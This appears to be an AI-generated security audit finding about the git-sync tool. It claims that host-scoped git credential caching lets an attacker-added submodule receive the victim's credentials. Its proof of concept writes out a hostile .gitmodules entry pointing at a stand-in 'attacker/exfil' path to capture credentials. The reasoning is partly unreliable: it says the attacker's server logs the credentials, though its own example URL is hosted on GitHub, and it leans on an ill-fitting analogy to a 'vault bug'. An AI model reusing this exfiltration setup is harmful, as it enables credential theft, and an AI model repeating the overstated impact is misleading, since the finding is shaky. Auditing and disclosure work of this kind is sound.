## Analysis: Credential-scope conflation via submodules (analog of "treat all X the same")

### Title
Global git credential cache lacks per-path scoping, allowing credential exfiltration via attacker-controlled submodule URLs on the same host - (File: `main.go`)

### Summary
The vault bug's root cause is that it treats fungible-looking-but-distinct assets (different tokens) identically, letting an attacker deposit a "cheap" one and redeem a "valuable" one. The closest reachable analog in `git-sync` is in its git credential handling: git-sync configures a single global `credential.helper=cache` and stores credentials for the main `--repo` (and any `--credential` entries) by URL, but relies on git's default credential matching, which is scoped by protocol+host only, not full path, unless `credential.useHttpPath` is explicitly set. `git-sync` never sets `credential.useHttpPath`.

### Finding Description
`git-sync`'s `SetupDefaultGitConfigs` installs one global, non-path-scoped credential cache: [1](#0-0) 

Credentials for the main repo and GitHub App tokens are stored via `StoreCredentials`, which internally uses `git credential approve` against the supplied URL: [2](#0-1) [3](#0-2) 

Because git's credential subsystem, absent `credential.useHttpPath`, matches cached/approved credentials by protocol+host (treating every path under that host "the same"), any submodule pulled from repo content — which is attacker-influenced input reachable via `configureWorktree`'s unconditional `git submodule update --init [--recursive]` — that points to a different repository path on the *same host* as the main `--repo` will transparently receive the previously stored credentials: [4](#0-3) 

This is structurally identical to the reported vault flaw: the system's trust/credit unit (shares in the vault; approved credentials in git-sync) is minted/scoped for one specific asset (a particular stablecoin; a specific repo URL) but redeemed/consumed against a different asset of the same "class" (any stablecoin in the vault; any repo path on the same host) because the scoping check treats them as fungible.

### Impact Explanation
An attacker who can influence repo content that `git-sync` checks out (e.g., a compromised/malicious branch, or any commit reachable via the configured `--ref`) can add or modify a `.gitmodules` entry pointing to an attacker-controlled path on the same git host used for `--repo` (e.g., `https://github.com/attacker/exfil` when `--repo=https://github.com/victim/legit`). During `configureWorktree`'s submodule update, git will present the cached credentials for that host to the attacker's server, resulting in disclosure of the victim's git credentials (username/password or GitHub App installation token) to a server the attacker controls.

### Likelihood Explanation
This requires: (1) submodules enabled (the default is `recursive`, not `off`, per `--submodules`), (2) an attacker able to introduce/alter repo content synced by `git-sync` (a supply-chain / malicious-commit scenario consistent with the "untrusted repo content" reachability class), and (3) the credential host matching a hostname the attacker can also host a path/repo on (common for large multi-tenant git hosts like GitHub/GitLab/Bitbucket where anyone can create a repo under their own path). Given `--submodules` defaults to recursive and git-sync never sets `credential.useHttpPath=true`, likelihood is moderate-to-high wherever credentials are configured (`--credential`, `--askpass-url`, `--github-app-*`) and the target host allows attacker-owned paths.

### Recommendation
- Set `credential.useHttpPath=true` globally (or per matching credential context) so cached/approved credentials are scoped to the exact path, not just the host, matching the intended per-URL scoping already expressed by the `--credential` flag's `url` field.
- Alternatively/additionally, restrict submodule updates to an explicit allow-list of hosts/paths, or require `--submodules=off` by default for untrusted repos, and document the host-wide credential sharing risk in the `--credential`/`--askpass-url`/`--github-app-*` sections of `README.md`.

### Proof of Concept
1. Configure `git-sync --repo=https://github.com/victim/legit --credential='{"url":"https://github.com/victim/legit","username":"x","password-file":"/creds/pw"}'` (or use `--askpass-url`/`--github-app-*`) with default `--submodules=recursive`.
2. Attacker gains ability to push/merge a commit into the synced ref (or compromises an upstream dependency merged into it) that adds `.gitmodules` with `url = https://github.com/attacker/exfil`.
3. On next sync, `configureWorktree` runs `git submodule update --init --recursive`: [4](#0-3) 
4. Because `credential.helper=cache` matches by host only, git sends the stored `victim/legit` credentials in the HTTPS Basic-Auth request to `https://github.com/attacker/exfil`, which the attacker's server logs — disclosing the credential/token outside `--root` and outside the intended repo scope.

*(Note: I was unable to fully trace every internal call path of `StoreCredentials`/`git credential approve` line-by-line beyond what is cited above due to index size limits; a Devin session with full repo access could confirm the exact `git credential approve` invocation and verify whether any existing `useHttpPath` or host-restriction config already mitigates this, in case it was added elsewhere and not surfaced by search.)*
